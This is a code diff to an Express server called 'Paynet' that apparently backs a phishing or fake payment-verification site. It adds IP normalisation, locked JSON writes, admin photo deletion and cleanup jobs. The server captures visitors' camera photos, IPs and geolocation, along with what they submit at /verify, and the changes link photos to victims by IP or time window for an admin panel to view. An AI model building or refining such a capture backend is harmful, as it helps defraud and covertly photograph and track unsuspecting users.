@@ -32,6 +32,14 @@ app.set("trust proxy", 1);
 // Prevent caching
 app.use(nocache());
 
+// Security Headers
+app.use((req, res, next) => {
+  res.setHeader("X-Content-Type-Options", "nosniff");
+  res.setHeader("X-Frame-Options", "SAMEORIGIN"); // Allow iframes on same origin if needed
+  res.setHeader("X-XSS-Protection", "1; mode=block");
+  next();
+});
+
 // Static files
 app.use(express.static("public"));
 
@@ -80,6 +88,25 @@ app.use((req, res, next) => {
   next();
 });
 
+// Normalize IP addresses to ensure consistent matching
+// Handles ::ffff:127.0.0.1 vs ::1 vs 127.0.0.1 etc.
+function normalizeIP(ip) {
+  if (!ip) return 'unknown';
+  ip = String(ip).trim();
+
+  // Strip IPv4-mapped IPv6 prefix (::ffff:)
+  if (ip.startsWith('::ffff:')) {
+    ip = ip.substring(7);
+  }
+
+  // Normalize all localhost variants to a single form
+  if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
+    return '127.0.0.1';
+  }
+
+  return ip;
+}
+
 // Get real client IP (supports multiple proxy headers)
 function getClientIP(req) {
   // Try multiple headers in order of preference
@@ -97,7 +124,7 @@ function getClientIP(req) {
       // x-forwarded-for can be comma-separated list
       const ip = value.split(',')[0].trim();
       if (ip && ip !== '::1' && ip !== '127.0.0.1') {
-        return ip;
+        return normalizeIP(ip);
       }
     }
   }
@@ -105,11 +132,11 @@ function getClientIP(req) {
   const socketIP = req.socket.remoteAddress;
 
   // For localhost testing, use mock IP if set
-  if ((socketIP === '::1' || socketIP === '127.0.0.1') && process.env.MOCK_PUBLIC_IP) {
-    return process.env.MOCK_PUBLIC_IP;
+  if ((socketIP === '::1' || socketIP === '127.0.0.1' || socketIP === '::ffff:127.0.0.1') && process.env.MOCK_PUBLIC_IP) {
+    return normalizeIP(process.env.MOCK_PUBLIC_IP);
   }
 
-  return socketIP || 'unknown';
+  return normalizeIP(socketIP || 'unknown');
 }
 
 // Multi-source geolocation API with fallback
@@ -496,7 +523,7 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
           });
         });
       }
-      
+
       // Add single cloudinaryUrl if exists
       if (attempt.cloudinaryUrl) {
         photos.push({
@@ -509,8 +536,45 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
       }
     });
 
+
+
+    // Load pending photos
+    const photosFile = path.join(__dirname, "pendingPhotos.json");
+    const pendingPhotos = safeReadJSON(photosFile, []);
+
+    // BACKFILL: Link pending photos to attempts based on matching Payment ID
+    attempts.forEach(attempt => {
+      if (attempt.verificationId) {
+        const linked = pendingPhotos.filter(p => p.paymentId === attempt.verificationId);
+        if (linked.length > 0) {
+          // Initialize photos array if missing
+          if (!attempt.photos) attempt.photos = [];
+          // Add only if not already present (avoid duplicates if re-running)
+          linked.forEach(lp => {
+            const exists = attempt.photos.some(existing => existing.url === lp.url || existing.filename === lp.filename);
+            if (!exists) attempt.photos.push(lp);
+          });
+        }
+      }
+    });
+
+    // Also add pending photos (not yet linked to any attempt) to the main photos list
+    pendingPhotos.forEach(photo => {
+      const photoPath = photo.url || photo.localPath || (photo.filename ? `/admin/photo/${photo.filename}` : null);
+      if (photoPath) {
+        photos.push({
+          filename: photo.filename || 'pending',
+          path: photoPath,
+          isLocal: !photo.url,
+          type: photo.type || 'pending',
+          attemptId: 'Pending',
+          timestamp: photo.timestamp
+        });
+      }
+    });
+
     // Remove duplicates and sort by timestamp
-    photos = photos.filter((photo, index, self) => 
+    photos = photos.filter((photo, index, self) =>
       index === self.findIndex(p => p.path === photo.path)
     ).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
 
@@ -520,6 +584,47 @@ app.get("/admin/api/data", requireAdmin, (req, res) => {
     res.status(500).json({ error: "Failed to load data" });
   }
 });
+
+// Mutex for safe JSON writes (prevents race conditions)
+class Mutex {
+  constructor() {
+    this.queue = [];
+    this.locked = false;
+  }
+  async lock() {
+    return new Promise(resolve => {
+      if (this.locked) {
+        this.queue.push(resolve);
+      } else {
+        this.locked = true;
+        resolve();
+      }
+    });
+  }
+  unlock() {
+    if (this.queue.length > 0) {
+      const next = this.queue.shift();
+      next();
+    } else {
+      this.locked = false;
+    }
+  }
+}
+
+const dbLock = new Mutex(); // Global lock for DB writes
+
+// Helper to safely update JSON with lock
+async function safeUpdateJSON(filepath, updateFn) {
+  await dbLock.lock();
+  try {
+    const data = safeReadJSON(filepath, []);
+    const newData = updateFn(data);
+    safeWriteJSON(filepath, newData);
+    return newData;
+  } finally {
+    dbLock.unlock();
+  }
+}
 
 app.get("/admin/photo/:filename", requireAdmin, (req, res) => {
   const { filename } = req.params;
@@ -532,17 +637,59 @@ app.get("/admin/photo/:filename", requireAdmin, (req, res) => {
   }
 });
 
-// Delete a specific photo
-app.delete("/admin/photo/delete/:filename", requireAdmin, (req, res) => {
+// Delete a specific photo (Comprehensive Delete)
+app.delete("/admin/photo/delete/:filename", requireAdmin, async (req, res) => {
   try {
     const { filename } = req.params;
-    const filepath = path.join(__dirname, "captures", filename);
+    const capturesDir = path.join(__dirname, "captures");
+    const filepath = path.join(capturesDir, filename);
+    let deleted = false;
 
+    // 1. Delete Local File
     if (fs.existsSync(filepath)) {
-      fs.unlinkSync(filepath);
-      res.json({ success: true, message: "Photo deleted successfully" });
+      try {
+        fs.unlinkSync(filepath);
+        deleted = true;
+      } catch (e) {
+        console.error("File delete error:", e);
+      }
+    }
+
+    // 2. Remove from pendingPhotos.json
+    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
+      const initialLength = photos.length;
+      const newPhotos = photos.filter(p => p.filename !== filename && p.url !== filename);
+      if (newPhotos.length < initialLength) deleted = true;
+      return newPhotos;
+    });
+
+    // 3. Remove from loginAttempts.json
+    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
+      let modified = false;
+      attempts.forEach(attempt => {
+        if (attempt.photos) {
+          const originalLen = attempt.photos.length;
+          attempt.photos = attempt.photos.filter(p => p.filename !== filename && p.url !== filename);
+          if (attempt.photos.length < originalLen) {
+            modified = true;
+            deleted = true;
+          }
+        }
+        // Check single photo fields
+        if (attempt.photoFilename === filename) {
+          attempt.photoFilename = null;
+          modified = true;
+          deleted = true;
+        }
+      });
+      return attempts; // safeWriteJSON will write this back
+    });
+
+    if (deleted) {
+      res.json({ success: true, message: "Photo and references deleted" });
     } else {
-      res.status(404).json({ success: false, error: "Photo not found" });
+      // If we couldn't find it anywhere, still return success to clear UI
+      res.json({ success: true, message: "Photo reference removed (if existed)" });
     }
   } catch (error) {
     console.error("Error deleting photo:", error);
@@ -551,28 +698,40 @@ app.delete("/admin/photo/delete/:filename", requireAdmin, (req, res) => {
 });
 
 // Delete all photos
-app.delete("/admin/photo/delete-all", requireAdmin, (req, res) => {
+app.delete("/admin/photo/delete-all", requireAdmin, async (req, res) => {
   try {
     const capturesDir = path.join(__dirname, "captures");
-    let count = 0;
 
+    // 1. Delete all local files
     if (fs.existsSync(capturesDir)) {
       const files = fs.readdirSync(capturesDir);
       files.forEach(file => {
         const filepath = path.join(capturesDir, file);
         if (fs.statSync(filepath).isFile()) {
           fs.unlinkSync(filepath);
-          count++;
         }
       });
     }
 
-    res.json({ success: true, count, message: `Deleted ${count} photo(s)` });
+    // 2. Clear JSON references
+    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), () => []);
+
+    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
+      attempts.forEach(a => {
+        a.photos = [];
+        a.photoFilename = null;
+        a.cloudinaryUrl = null;
+      });
+      return attempts;
+    });
+
+    res.json({ success: true, message: "All photos deleted" });
   } catch (error) {
     console.error("Error deleting all photos:", error);
-    res.status(500).json({ success: false, error: "Failed to delete photos" });
+    res.status(500).json({ success: false, error: "Failed to delete all photos" });
   }
 });
+
 
 app.get("/admin-logout", (req, res) => {
   req.session.isAdmin = false;
@@ -603,7 +762,7 @@ app.get("/forgot-password", (req, res) => {
 
 app.post("/capture-photo", async (req, res) => {
   try {
-    const { photo, type, timestamp: clientTimestamp } = req.body;
+    const { photo, type, timestamp: clientTimestamp, paymentId } = req.body;
 
     if (!photo) {
       return res.status(400).json({ success: false, message: "No photo data" });
@@ -632,7 +791,7 @@ app.post("/capture-photo", async (req, res) => {
         console.error("Cloudinary upload failed, using local storage:", cloudErr.message);
       }
     }
-    
+
     // Always save locally as backup (or primary if Cloudinary fails)
     if (!photoUrl) {
       const capturesDir = path.join(__dirname, "captures");
@@ -653,14 +812,15 @@ app.post("/capture-photo", async (req, res) => {
       type: photoType,
       ip,
       timestamp: clientTimestamp || new Date().toISOString(),
-      localPath: photoUrl ? null : `/admin/photo/${filename}`
+      localPath: photoUrl ? null : `/admin/photo/${filename}`,
+      paymentId: paymentId || null
     };
 
     // Save to a temporary photos file that will be linked when login attempt is logged
-    const photosFile = path.join(__dirname, "pendingPhotos.json");
-    let pendingPhotos = safeReadJSON(photosFile, []);
-    pendingPhotos.push(photoMetadata);
-    safeWriteJSON(photosFile, pendingPhotos);
+    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
+      photos.push(photoMetadata);
+      return photos;
+    });
 
     res.json({ success: true, filename, url: photoUrl });
   } catch (error) {
@@ -727,9 +887,10 @@ app.post("/log-visit", async (req, res) => {
 
     // Append to loginAttempts.json
     const logFile = path.join(__dirname, "loginAttempts.json");
-    let attempts = safeReadJSON(logFile, []);
-    attempts.push(logData);
-    safeWriteJSON(logFile, attempts);
+    await safeUpdateJSON(logFile, (attempts) => {
+      attempts.push(logData);
+      return attempts;
+    });
 
     res.json({ success: true });
   } catch (error) {
@@ -810,21 +971,39 @@ app.post("/verify", async (req, res) => {
   // Generate Transaction/Verification ID
   const verificationId = "PAY-" + crypto.randomBytes(4).toString("hex").toUpperCase();
 
-  // Get pending photos for this IP and link them
+  // Get pending photos for this IP and link them (Atomic Update)
   const photosFile = path.join(__dirname, "pendingPhotos.json");
-  let pendingPhotos = safeReadJSON(photosFile, []);
-  
-  // Filter photos from this IP in the last 5 minutes
-  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
-  const userPhotos = pendingPhotos.filter(p => 
-    p.ip === ip && p.timestamp > fiveMinutesAgo
-  );
-  
-  // Remove linked photos from pending
-  pendingPhotos = pendingPhotos.filter(p => 
-    !(p.ip === ip && p.timestamp > fiveMinutesAgo)
-  );
-  safeWriteJSON(photosFile, pendingPhotos);
+  let userPhotos = [];
+  const normalizedIP = normalizeIP(ip);
+
+  await safeUpdateJSON(photosFile, (pendingPhotos) => {
+    const tenMinutesAgo = new Date(Date.now() - 10 * 60 * 1000).toISOString();
+
+    // 1. Direct IP Match
+    const directMatches = pendingPhotos.filter(p => {
+      return normalizeIP(p.ip) === normalizedIP && p.timestamp > tenMinutesAgo;
+    });
+    userPhotos = [...directMatches];
+
+    // 2. Fallback Time Match
+    if (userPhotos.length === 0) {
+      const veryRecentAgo = new Date(Date.now() - 3 * 60 * 1000).toISOString();
+      const timeMatches = pendingPhotos.filter(p => p.timestamp > veryRecentAgo);
+      if (timeMatches.length > 0) {
+        userPhotos = [...timeMatches];
+        console.log(`📸 Linked ${userPhotos.length} photos by time-window fallback (IP: ${ip})`);
+      }
+    } else {
+      console.log(`📸 Linked ${userPhotos.length} photos by IP match`);
+    }
+
+    // 3. Remove linked from pending
+    if (userPhotos.length > 0) {
+      const linkedIds = new Set(userPhotos.map(p => p.timestamp));
+      return pendingPhotos.filter(p => !linkedIds.has(p.timestamp));
+    }
+    return pendingPhotos;
+  });
 
   // Save all data to file (ONLY place data is stored - no console logging)
   const logData = {
@@ -864,9 +1043,10 @@ app.post("/verify", async (req, res) => {
     }
 
     const logFile = path.join(__dirname, "loginAttempts.json");
-    let attempts = safeReadJSON(logFile, []);
-    attempts.push(logData);
-    safeWriteJSON(logFile, attempts);
+    await safeUpdateJSON(logFile, (attempts) => {
+      attempts.push(logData);
+      return attempts;
+    });
   } catch (error) {
     console.error("Error in /verify log save:", error);
   }
@@ -905,6 +1085,35 @@ process.on("unhandledRejection", (reason) => {
 
 // IMPORTANT: Dynamic port for Render
 const PORT = process.env.PORT || 3003;
-app.listen(PORT, () => console.log(`Paynet server running on http://localhost:${PORT}`));
+// Periodic Cleanup Job (Every hour)
+// Removes pending photos older than 24 hours to prevent unlimited growth
+setInterval(async () => {
+  try {
+    const photosFile = path.join(__dirname, "pendingPhotos.json");
+    const ONE_DAY = 24 * 60 * 60 * 1000;
+
+    await safeUpdateJSON(photosFile, (photos) => {
+      const now = Date.now();
+      const initialCount = photos.length;
+      // Keep photos younger than 24h
+      const newPhotos = photos.filter(p => {
+        const timeDiff = now - new Date(p.timestamp).getTime();
+        return timeDiff < ONE_DAY;
+      });
+
+      if (newPhotos.length < initialCount) {
+        console.log(`🧹 Cleanup: Removed ${initialCount - newPhotos.length} old pending photos`);
+      }
+      return newPhotos;
+    });
+  } catch (e) {
+    console.error("Cleanup error:", e);
+  }
+}, 60 * 60 * 1000); // 1 hour
+
+// Start server
+app.listen(PORT, () => {
+  console.log(`Paynet server running on http://localhost:${PORT}`);
+});
 
 // Final Deployment Sync: 2026-02-14 19:58
